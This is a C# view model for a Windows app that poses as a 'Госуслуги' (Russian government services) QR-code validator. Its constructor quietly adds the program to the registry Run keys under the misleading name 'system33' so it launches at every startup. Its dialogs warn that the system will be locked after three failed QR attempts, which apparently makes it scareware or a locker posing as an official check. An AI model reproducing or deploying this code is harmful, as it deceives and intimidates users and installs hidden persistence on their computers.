using Microsoft.Win32;
using QrCodeValidatorApp.Commands;
using QrCodeValidatorApp.Models;
using QrCodeValidatorApp.Services;
using System;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Input;
using System.Windows.Threading;

namespace QrCodeValidatorApp.ViewsModels
{
    class QrCodeViewModel : ViewModelBase
    {
        private QrCode _currentQrCode;
        private bool _isQrCodeWriteMode = false;
        private string _qrCodeText;
        private int _attemptsLeft = 3;
        private readonly IMessageService _messageService;
        private readonly ISoundPlayService _soundPlayService;
        private bool _isAppRunning;
        private DispatcherTimer _timer;
        public QrCodeViewModel()
        {
            Title = "Госуслуги";
            SetQrCodeInputAsKeyboard = new RelayCommand(null,
                                                       SetQrCodeMode);
            CheckWrittenQrCode = new RelayCommand(IsWrittenQrCodeValid,
                                                  ShowInvalidAttemptError);
            _messageService = new MessageBoxService();
            _soundPlayService = new WavSoundPlayService();
            CloseApp = new RelayCommand(null, (obj) => IsAppRunning = false);
            _timer = new DispatcherTimer
            {
                Interval = TimeSpan.FromMinutes(10)
            };
            _timer.Tick += OnCloseApp;
            _timer.Start();
            IsAppRunning = false;
            SetAutostartIfNotSettled();
        }

        private void SetAutostartIfNotSettled()
        {
            const string HKLM = "HKEY_CURRENT_USER";
            const string HKCU = "HKEY_LOCAL_MACHINE";
            const string RUN_KEY_HKCU = @"Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run";
            const string RUN_KEY_HKLM = @"SOFTWARE\\Microsoft\Windows\CurrentVersion\Run";
            string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            try
            {
                if (Microsoft.Win32.Registry.GetValue(HKCU + "\\" + RUN_KEY_HKCU, "system33", null) == null)
                {
                    Microsoft.Win32.Registry.SetValue(HKCU + "\\" + RUN_KEY_HKCU, "system33", exePath);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            try
            {
                if (Microsoft.Win32.Registry.GetValue(HKLM + "\\" + RUN_KEY_HKLM, "system33", null) == null)
                {
                    Microsoft.Win32.Registry.SetValue(HKLM + "\\" + RUN_KEY_HKLM, "system33", exePath);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
           ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("system33", exePath);
        }

        private void OnCloseApp(object sender, EventArgs e)
        {
            //IsAppRunning = true;
            (sender as DispatcherTimer).Stop();
        }

        private void ShowInvalidAttemptError(object obj)
        {
            AttemptsLeft--;
            if (AttemptsLeft > 0)
            {
                _soundPlayService.Play(Properties.Resources.badAttempt);
                _messageService.Show(string.Format("Не удалось прочитать QR-код. " +
                    "Пожалуйста, попробуйте ещё раз. {0}{0}" +
                    "Осталось попыток до блокировки системы: " +
                    $"{AttemptsLeft}", Environment.NewLine));
            }
        }

        private bool IsWrittenQrCodeValid(object arg)
        {
            return !string.IsNullOrWhiteSpace(QrCodeText) && AttemptsLeft > 0;
        }

        private void SetQrCodeMode(object parameter)
        {
            IsQrCodeInWriteMode = Convert.ToBoolean(parameter);
        }

        public QrCode CurrentQrCode
        {
            get => _currentQrCode; set
            {
                _currentQrCode = value;
                OnPropertyChanged();
            }
        }

        public ICommand SetQrCodeInputAsKeyboard { get; set; }
        public ICommand CheckWrittenQrCode { get; set; }
        public ICommand CloseApp { get; set; }

        public bool IsQrCodeInWriteMode
        {
            get => _isQrCodeWriteMode; set
            {
                _isQrCodeWriteMode = value;
                OnPropertyChanged();
            }
        }

        public string QrCodeText
        {
            get => _qrCodeText; set
            {
                _qrCodeText = value;
                OnPropertyChanged();
            }
        }

        public int AttemptsLeft
        {
            get => _attemptsLeft; set
            {
                _attemptsLeft = value;
                if (_attemptsLeft == 0)
                {
                    _soundPlayService.Play(Properties.Resources.fatalError);
                }
                OnPropertyChanged();
            }
        }

        public bool IsAppRunning
        {
            get => _isAppRunning; set
            {
                _isAppRunning = value;
                foreach (System.Windows.Window window in App.Current.Windows)
                {
                    if (_isAppRunning)
                    {
                        window.Show();
                    }
                    else
                    {
                        window.Hide();
                    }
                }
                OnPropertyChanged();
            }
        }
    }
}
